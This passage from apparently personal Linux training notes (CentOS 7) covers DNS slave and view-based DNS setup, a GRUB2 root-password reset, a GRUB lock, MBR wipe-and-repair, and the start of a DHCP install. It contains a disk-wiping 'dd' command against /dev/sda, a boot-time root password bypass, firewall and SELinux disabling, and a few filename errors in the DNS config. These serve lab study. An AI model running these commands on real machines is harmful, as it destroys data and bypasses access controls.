class="hljs shell"><span class="hljs-meta">#</span><span class="bash">与前面一样</span><br>vim /etc/named.conf<br><br>options &#123;<br>        listen-on port 53 &#123; any; &#125;;<br>        listen-on-v6 port 53 &#123; ::1; &#125;;<br>        directory       &quot;/var/named&quot;;<br>        dump-file       &quot;/var/named/data/cache_dump.db&quot;;<br>        statistics-file &quot;/var/named/data/named_stats.txt&quot;;<br>        memstatistics-file &quot;/var/named/data/named_mem_stats.txt&quot;;<br>        recursing-file  &quot;/var/named/data/named.recursing&quot;;<br>        secroots-file   &quot;/var/named/data/named.secroots&quot;;<br>        allow-query     &#123; any; &#125;;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">注意！！！！！这里变了</span><br>[root@localhost ~] vim /etc/named.rfc1912.zones<br><br>zone &quot;qiye.com&quot; IN &#123;<br>        type slave;    #改成slave<br>        file &quot;slave/qiye.com.zone&quot;;    #路径可以变<br>        masters &#123; 192.168.241.129; &#125;;  #主DNS服务器的ip地址<br>&#125;;<br><br>zone &quot;241.168.192.in-addr.arpa&quot; IN &#123;<br>        type slave;    #改成slave<br>        file &quot;slave/qiye.com.local&quot;;   #路径变了<br>        masters &#123; 192.168.241.129; &#125;;  #主DNS服务器ip地址<br>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">DNS修改</span><br>[root@localhost ~] vim /etc/resolv.conf<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash">domain localdomain</span><br>search localdomain<br><span class="hljs-meta">#</span><span class="bash">nameserver 192.168.241.2</span><br>nameserver 192.168.241.129    #主DNS服务器ip地址<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">查看有无正反向解析文件存在</span><br>[root@localhost ~] ls /var/named/slaves/   #如果不存在，则把主DNS服务器的两个正反解析文件拷过来到slaves文件夹里（我的是这两个文件 qiye.com.zone，qiye.com.local）<br><br>[root@localhost ~] cd /var/named/slaves/<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">更新DNS服务</span><br>[root@localhost ~] systemctl restart named<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">验证是否成功</span><br><br>[root@localhost ~] ifconfig<br>eno16777736: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500<br>        inet 192.168.241.134  netmask 255.255.255.0  broadcast 192.168.241.255<br><br>[root@localhost ~] nslookup www.qiye.com<br>Server:192.168.241.129<br>Address:192.168.241.129#53<br><br>Name:www.qiye.com<br>Address: 192.168.241.129<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash">ping一下，发现解析成功！</span><br>[root@localhost ~] ping www.qiye.com<br>PING www.qiye.com (192.168.241.129) 56(84) bytes of data.<br>64 bytes from www.qiye.com (192.168.241.129): icmp_seq=1 ttl=64 time=0.782 ms<br>64 bytes from email.qiye.com (192.168.241.129): icmp_seq=2 ttl=64 time=0.419 ms<br>64 bytes from email.qiye.com (192.168.241.129): icmp_seq=3 ttl=64 time=0.711 ms<br>^C<br>--- www.qiye.com ping statistics ---<br>3 packets transmitted, 3 received, 0% packet loss, time 2002ms<br>rtt min/avg/max/mdev = 0.419/0.637/0.782/0.158 ms<br><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/1b34eadb21424a0cb7e86a8690579dd9.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="验证成功"></p><p>完成，<a href="http://www.qiye.com正是主dns服务器的域名,ip地址192.168.241.129/">www.qiye.com正是主DNS服务器的域名，ip地址192.168.241.129</a></p><p>ya<em>da</em>ze！</p><h4 id="5-智能解析"><a href="#5-智能解析" class="headerlink" title="5.智能解析"></a>5.智能解析</h4><p>部署一台DNS智能解析服务器，对 qiye.com 域名做如下智能解析：</p><p>广州用户解析 IP 为 1.1.1.1</p><p>深圳用户解析 IP 为 2.2.2.2</p><p>其他用户解析为 3.3.3.3</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">修改主配置文件</span><br>vim /etc/named.conf<br><span class="hljs-meta">#</span><span class="bash">新增以下</span><br>acl gz &#123;              #规则：这个网段ip，返回gz文件的DNS的ip<br>    192.168.247.0/24;<br>&#125;;<br>acl sz &#123;#规则：这个网段ip，返回sz文件的DNS的ip<br>    192.168.100.0/24;<br>&#125;;<br>acl ot &#123;     #规则：除上述网段ip，返回ot文件的DNS的ip<br>    any;<br>&#125;;<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash">并且注释zone <span class="hljs-string">&quot;.&quot;</span></span><br>/*<br>zone &quot;.&quot; IN &#123;<br>        type hint;<br>        file &quot;named.ca&quot;;<br>&#125;;<br>*/<br><br>view guangzhou&#123;<br>match-clients &#123; gz; &#125;;<br>zone &quot;.&quot; IN &#123;<br>        type hint;<br>        file &quot;named.ca&quot;;<br>&#125;;<br>zone &quot;qiye.com&quot; IN &#123;<br>        type master;<br>        file &quot;qiye.com.zone.gz&quot;;<br>&#125;;<br>&#125;;<br><br>view shenzhen &#123;<br>match-clients &#123; sz; &#125;;<br>zone &quot;.&quot; IN &#123;<br>        type hint;<br>        file &quot;named.ca&quot;;<br>&#125;;<br>zone &quot;qiye.com&quot; IN &#123;<br>        type master;<br>        file &quot;qiye.com.zone.gz&quot;;<br>&#125;;<br>&#125;;<br><br>view other &#123;<br>match-clients &#123; any; &#125;;<br>zone &quot;.&quot; IN &#123;<br>        type hint;<br>        file &quot;named.ca&quot;;<br><br>&#125;;<br>zone &quot;qiye.com&quot; IN &#123;<br>        type master;<br>        file &quot;qiye.com.zone.ot&quot;;<br>&#125;;<br>&#125;;       <br><span class="hljs-meta">#</span><span class="bash">还有注释了下面这个</span><br><span class="hljs-meta">#</span><span class="bash">include <span class="hljs-string">&quot;/etc/named.rfc1912.zones&quot;</span>;</span><br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#把新增的文件补上</span><br><span class="hljs-built_in">cd</span> /var/named/<br><span class="hljs-built_in">cp</span> qiye.com.zone qiye.com.zone.gz<br><span class="hljs-built_in">cp</span> qiye.com.zone qioye.com.zone.sz <br><span class="hljs-built_in">cp</span> qiye.com.zone qiye.com.zone.ot <br>chgrp named qiye.com.zone.* <br>并且把每个复制后生成的文件，改一下解析域名解析<br>vim qiye.com.zone.gz<br>www A <span class="hljs-number">1.1</span>.<span class="hljs-number">1.1</span><br>vim qiye.com.zone.se<br>www A <span class="hljs-number">2.2</span>.<span class="hljs-number">2.2</span><br>vim qiye.com.zone.ot<br>www A <span class="hljs-number">3.3</span>.<span class="hljs-number">3.3</span><br></code></pre></td></tr></table></figure><p>验证可能</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">可以发现我的ip为192.168.241.129的时候，根据上述增加的acl规则，DNS服务器给我返回了other的3.3.3.3</span><br>[root@localhost named] ifconfig<br>eno16777736: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500<br>        inet 192.168.241.129  netmask 255.255.255.0  broadcast 192.168.241.255<br><br>[root@localhost named]# host www.qiye.com<br>www.qiye.com has address 3.3.3.3    <br></code></pre></td></tr></table></figure><p>ya✧da✧ze!</p>]]></content>
    
    
    <categories>
      
      <category>实训</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>DNS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>实训第一天</title>
    <link href="/2021/11/22/%E5%AE%9E%E8%AE%AD%E7%AC%AC%E4%B8%80%E5%A4%A9-GRUB2-DHCP/"/>
    <url>/2021/11/22/%E5%AE%9E%E8%AE%AD%E7%AC%AC%E4%B8%80%E5%A4%A9-GRUB2-DHCP/</url>
    
    <content type="html"><![CDATA[<h1 id="实训第一天"><a href="#实训第一天" class="headerlink" title="实训第一天"></a>实训第一天</h1><h3 id="GRUB2的使用"><a href="#GRUB2的使用" class="headerlink" title="GRUB2的使用"></a>GRUB2的使用</h3><h4 id="1-忘记root密码怎么办？"><a href="#1-忘记root密码怎么办？" class="headerlink" title="1.忘记root密码怎么办？"></a>1.忘记root密码怎么办？</h4><p>首先，我们先把root密码忘了，然后重启（reboot）</p><p><img src="https://img-blog.csdnimg.cn/548c5d4f5bc84b6d9d979f2fd7eefe2e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="reboot"></p><p>在GRUB2启动屏显时，按下e键进入编辑模式</p><p><img src="https://img-blog.csdnimg.cn/c9c193db13bb4e4a8db0078ce4b58e48.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="编辑模式"></p><p>然后我们定位到linux16开头的行，按下end键直接来这段命令的末尾，<br>并增加 rd.break，ctrl+x一下</p><p><img src="https://img-blog.csdnimg.cn/622285b1a48f43758793b93e91901a17.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="定位至linux16"></p><p>进入emergency mode界面<br>我有个信息收集的习惯，先fuzz一下<br>命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">whoami<br>ls<br>mount<br></code></pre></td></tr></table></figure><p>可以发现的是，当前是无用户情况的系统调试界面,而且xfs是只读</p><p><img src="https://img-blog.csdnimg.cn/0588287df5a94faeaebc17a28ed865cb.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="xfs"></p><p>那就以读写的形式挂载给我改下密码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">mount -o remount,rw /sysroot      #以读写方式重新挂载系统分区至/sysroot<br>chroot /sysroot       #改变根目录至/sysroot<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/79342611edc7481288cd89b4e07705d5.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_16,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="挂载至/sysroot"></p><p>可以发现，我们通过改变根目录方式来使用root用户，那么改变密码也成为可能<br>本菜鸡只会两种改变密码的命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo 123 | passwd --stdin root         //本次实训所用<br>passwd root<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/bd4b5bb1b1984e5ca7311644994aac27.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_17,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="修改密码"></p><p>SELinux 它是一个安全增强系统, 其内部有许多安全策略<br>针对一些操作, 如果你做了这些操作, 没有得到策略的放行, 它会给你禁止掉<br>比如你使用单用修改root密码是不被策略放行的<br>怎么让 SELinux 策略放行呢?</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">&quot;touch /.autorelabel&quot; 创建这样一个文件其实就是在告诉SELinux放行这个策略,就是通知一下<br>直接关闭掉 SELinux<br></code></pre></td></tr></table></figure><p>参考：<a href="https://blog.csdn.net/songhaixing2/article/details/109780512">https://blog.csdn.net/songhaixing2/article/details/109780512</a></p><p>由于使用了SElinux，必须运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">touch /.autorelabel<br></code></pre></td></tr></table></figure><p>否则系统无法正常使用<br><img src="https://img-blog.csdnimg.cn/88608c43d72e4fb5a57879656cfd3ac2.png#pic_center" alt="SElinux"></p><p>退出当前用户，重启system<br>登录root，密码123（原密码为：qiye）</p><p><img src="https://img-blog.csdnimg.cn/f17f4943a4ba42a59fea4419527ab46a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="root安全登录"></p><p>可以发现成功登录root，ya☆da☆ze！</p><h4 id="2-加把安全锁"><a href="#2-加把安全锁" class="headerlink" title="2.加把安全锁"></a>2.加把安全锁</h4><p>用安全角度来看，能够使用GRUB2直接修改root密码，无疑是一种提权方法，是一种安全漏洞<br>这就相当于，只要别人知道你家地址，便能直接进你家，所以就常识而言，为了安全，加把锁很重要</p><p>使用grub2-mkpasswd-pbkdf2  命令生成加密口令<br>这里密码为：qiye</p><p><img src="https://img-blog.csdnimg.cn/20b040b2c9714f67bba7fa6bbe4832cc.png#pic_center" alt="grub2-mkpasswd-pbkdf2"></p><p>既然是通过grub2修改的密码，那就修改他的配置文件/boot/grub2/grub.cfg<br>为了方便操作，新开一个终端窗口：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim /boot/grub2/grub.cfg<br></code></pre></td></tr></table></figure><p>可以看到，配置文件已经注释出界面顺序（太贴心了，嘤嘤嘤），我们把锁加到### BEGIN /etc/grub.d/10_linux ###下面，menuentry那一行的上面：<br><img src="https://img-blog.csdnimg.cn/1b739c4d1daf4ccd8249844f1a5bcfeb.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="锁"></p><p>保存退出，一样reboot重启，再次进入gurb2界面<br><img src="https://img-blog.csdnimg.cn/abac3874e5154fb68176cbbe82af4d44.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="grub2"></p><ul><li>输入用户：qiye</li><li>密码：qiye</li></ul><p>发现可以打开GURB2命令行界面，ya☆da☆ze！</p><h4 id="3-修复MBR"><a href="#3-修复MBR" class="headerlink" title="3.修复MBR"></a>3.修复MBR</h4><p>主引导记录，也叫主引导扇区</p><p><strong>Linux是文件型的操作系统，所有的信息和数据都以文件形式保存于系统中，但是并不是所有的数据，主</strong><br><strong>引导记录就不是以文件的形式保存，无法进行备份，只能通过 dd 命令备份</strong></p><ul><li><p><strong>先进行备份，再破坏</strong></p><p>使用 dd 命令，将 sda 的 MBR 进行备份<br>用 zero设备生成 446 字节的 “0” 写入 MBR<br>重启后发现系统已坏</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">备份</span><br>[root@localhost ~]# dd if=/dev/sda of=/root/mbr.bak count=1 bs=512<br>1+0 records in<br>1+0 records out<br>512 bytes (512 B) copied, 0.000676292 s, 757 kB/s<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash">破坏</span><br>[root@localhost ~]# dd if=/dev/zero of=/dev/sda count=1 bs=446<br>1+0 records in<br>1+0 records out<br>446 bytes (446 B) copied, 0.000305554 s, 1.5 MB/s<br></code></pre></td></tr></table></figure><p><strong>重启后，发现无法正常启动</strong></p><p><img src="https://img-blog.csdnimg.cn/56cab29ead3f46bcb06d629851cd055b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="无法启动"></p><ul><li><strong>连接镜像光盘，在光盘引导界面选择 Troubleshooting</strong><br>连接镜像：<br><img src="https://img-blog.csdnimg.cn/cd16079549994c52977e2c032b4be547.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="光盘连接"><br>使用Troubleshooting：<br><img src="https://img-blog.csdnimg.cn/ece88a6a64dc43d4ad515a2a3deb1f69.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="Troubleshooting"></li></ul><ul><li><strong>选择救援模式 Rescue a Centos system</strong></li></ul><p><img src="https://img-blog.csdnimg.cn/0623bc0b818141fb97ac8e2ed8d365f9.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="Rescue a Centos system"></p><ul><li><strong>选择Continue，以 rw 模式挂载分区</strong></li></ul><p><img src="https://img-blog.csdnimg.cn/4d377478d79c46a79d9167086f716ac9.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="Continue"></p><p>grub2-install 命令重建 Bootloader，随后 sync 写入硬盘，reboot 重启系统</p><p><img src="https://img-blog.csdnimg.cn/c55f1cb320e24c97b393627f42123b75.png#pic_center" alt="重建 Bootloader"></p><p>进入挂载文档，重新安装 Bootloader，sync写入硬盘，reboot重启system</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">sh-4.2 chroot /mnt/sysimage  <br>sh-4.2 grub2-install /dev/sda <br>sh-4.2 sync <br>sh-4.2 exit <br>sh-4.2 reboot<br></code></pre></td></tr></table></figure><p>完成！（我好菜，都是跟着文档来着）</p><p><img src="https://img-blog.csdnimg.cn/9e84860373ac4a23906ec3d5b1a9cc8a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="完成！"></p><h4 id="4-修复GRUB"><a href="#4-修复GRUB" class="headerlink" title="4.修复GRUB"></a>4.修复GRUB</h4><p><strong>我们设想，有没有一种可能，grub配置文件丢失，开机直接登录，但显然这是不可能的，它会直接进入grub界面，</strong><br><strong>直接让你调试解决</strong></p><p><strong>总之，乱来前能快照就快照（不能过度依靠），然后必须备份</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">备份</span><br>[root@localhost ~] mkdir grub2.bak<br>[root@localhost ~] chmod 777 grub2.bak/<br>[root@localhost ~] cp -rp /boot/grub2/* ./grub2.bak/<br>[root@localhost ~] ls grub2.bak/<br>device.map  fonts  grub.cfg  grubenv  i386-pc  locale  themes<br>[root@localhost ~]# <br><span class="hljs-meta">#</span><span class="bash">删除</span><br>[root@localhost ~] rm /boot/grub2/grub.cfg <br>rm: remove regular file ‘/boot/grub2/grub.cfg’? y<br>[root@localhost ~] reboot<br></code></pre></td></tr></table></figure><p>最好在确认一下，磁盘分区：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">df -h<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/ecbc5c3ab6214c0295657f4018b32d2e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="查看磁盘分区"><br>重启后，进入grub状态，一下调试参数：<br><img src="https://img-blog.csdnimg.cn/08edd513c12c4586a98d2c59d4ed9c1a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="grub"><br>小心版本问题啊，建议linux16  /vm   直接Tab出来就行</p><p>initrd16 /init  也一样</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">grub&gt;</span><span class="bash"> insmod xfs</span> <br><span class="hljs-meta"></span><br><span class="hljs-meta">grub&gt;</span><span class="bash"> <span class="hljs-built_in">set</span> root=<span class="hljs-string">&#x27;hd0,msdos1&#x27;</span>    <span class="hljs-comment">#你的/boot分区/dev/sda1,没错hd0对于sda，msdos1对应/dev/sda1</span></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">grub&gt;</span><span class="bash"> linux16 /vmlinuz-3.10.0-123.el7.x86_64</span> <br><br>root=/dev/sda3<br><span class="hljs-meta"></span><br><span class="hljs-meta">grub&gt;</span><span class="bash"> initrd16 /initramfs-3.10.0-123.el7.x86_64.img</span> <br><span class="hljs-meta"></span><br><span class="hljs-meta">grub&gt;</span><span class="bash"> boot</span><br></code></pre></td></tr></table></figure><p><strong>关于root=/dev/sda3：<br>我的系统分区位于/dev/sda3,不能搞错绝对路径！！！！</strong></p><p>恢复Grub</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@localhost ~] cp ./grub2.bak/grub.cfg /boot/grub2/ <br><br>[root@localhost ~] reboot<br></code></pre></td></tr></table></figure><p>能够正常重启！</p><h3 id="DHCP服务器的配置与使用"><a href="#DHCP服务器的配置与使用" class="headerlink" title="DHCP服务器的配置与使用"></a>DHCP服务器的配置与使用</h3><h4 id="1-安装DHCP服务"><a href="#1-安装DHCP服务" class="headerlink" title="1.安装DHCP服务"></a>1.安装DHCP服务</h4><p>检查是否有安装DHCP，若无提示，则未安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">rpm -qa dhcp<br></code></pre></td></tr></table></figure><p>关闭防火墙及SELinux策略</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@localhost ~] systemctl stop firewalld.service <br><br>[root@localhost ~] setenforce 0<br></code></pre></td></tr></table></figure><p>安装dhcp服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">挂载镜像</span><br>[root@localhost ~] mkdir /mnt/cdrom<br>[root@localhost ~] mount /dev/cdrom /mnt/cdrom/<br>mount: /dev/sr0 is write-protected, mounting read-only <br>[root@localhost ~] cd /mnt/cdrom/<br>[root@localhost cdrom] ls<br>CentOS_BuildTag  GPL       LiveOS    RPM-GPG-KEY-CentOS-7<br>EFI              images    Packages  RPM-GPG-KEY-CentOS-Testing-7<br>EULA             isolinux  repodata  TRANS.TBL<br>[root@localhost cdrom] cd Packages/<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash">在包内查找dhcp安装包</span><br>[root@localhost Packages] ls | grep  dhcp<br>dhcp-4.2.5-27.el7.centos.x86_64.rpm<br>dhcp-common-4.2.5-27.el7.centos.x86_64.rpm<br>dhcp-devel-4.2.5-27.el7.centos.i686.rpm<br>dhcp-devel-4.2.5-27.el7.centos.x86_64.rpm<br>dhcp-libs-4.2.5-27.el7.centos.i686.rpm<br>dhcp-libs-4.2.5-27.el7.centos.x86_64.rpm <br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash">安装dhcp</span><br>[root@localhost Packages] rpm -ivh dhcp-4.2.5-27.el7.centos.x86_64.rpm <br>warning: dhcp-4.2.5-27.el7.centos.x86_64.rpm: Header V3 RSA/SHA256 Signature, key ID f4a80eb5: NOKEY<br>Preparing...                          ################################# [100%]<br>Updating / installing...<br>   